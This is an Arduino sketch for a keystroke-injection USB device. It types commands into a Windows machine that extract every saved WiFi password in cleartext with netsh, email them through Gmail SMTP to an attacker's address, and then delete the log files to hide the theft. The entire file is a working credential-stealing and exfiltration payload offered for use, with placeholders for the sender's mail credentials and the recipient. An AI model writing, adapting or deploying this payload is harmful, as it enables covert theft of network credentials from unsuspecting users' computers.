#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  //Setup is empty
}

void loop() {
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW){
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(1000);

  // --> Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  // --> Open cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(200);

  // --> Get all SSID
  Keyboard.print("cd %USERPROFILE% & netsh wlan show profiles | findstr \"All\" > a.txt");

  typeKey(KEY_RETURN);

  // --> Create a filter.bat to get all the profile names
  Keyboard.print("echo setlocal enabledelayedexpansion^");

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  Keyboard.print("for /f \"tokens=5*\" %%i in (a.txt) do (^");

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  Keyboard.print("set val=%%i %%j^");

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  Keyboard.print("if \"!val:~-1!\" == \" \" set val=!val:~0,-1!^");

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  Keyboard.print("echo !val!^>^>b.txt) > filter.bat");

  typeKey(KEY_RETURN);

  // --> Run filter.bat and save all profile names in b.txt
  Keyboard.print("filter.bat");

  delay(300);

  typeKey(KEY_RETURN);

  // --> Save all the good stuff in Log.txt and delete the other garbage files
  Keyboard.print("(for /f \"tokens=*\" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name=\"%i\" key=clear | findstr /c:\"Key Content\" & echo.) > Log.txt");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("del a.txt b.txt filter.bat");

  typeKey(KEY_RETURN);

  // --> Mail Log.txt
  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPUser = 'Gmail email to send the data'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPPassword = 'Gmail email password'");

  typeKey(KEY_RETURN);

  Keyboard.print("$MailtTo = 'Email where you want to receive the data'");

  typeKey(KEY_RETURN);

  Keyboard.print("$MailFrom = 'Gmail email to send the data'");

  typeKey(KEY_RETURN);

  Keyboard.print("$MailSubject = 'WiFi key grabber'");

  typeKey(KEY_RETURN);

  Keyboard.print("$MailBody = (Get-Content Log.txt | out-string)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPCredential = New-Object System.Management.Automation.PSCredential -ArgumentList $SMTPUser, $($SMTPPassword | ConvertTo-SecureString -AsPlainText -Force)");

  typeKey(KEY_RETURN);

  Keyboard.print("Send-MailMessage -To $MailtTo -from $MailFrom -Subject $MailSubject -Body $MailBody -SmtpServer $SMTPServer -Credential $SMTPCredential -UseSsl -Port 587");

  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(500);

  // --> Delete Log.txt and exit
  Keyboard.print("del Log.txt & exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
  }
}
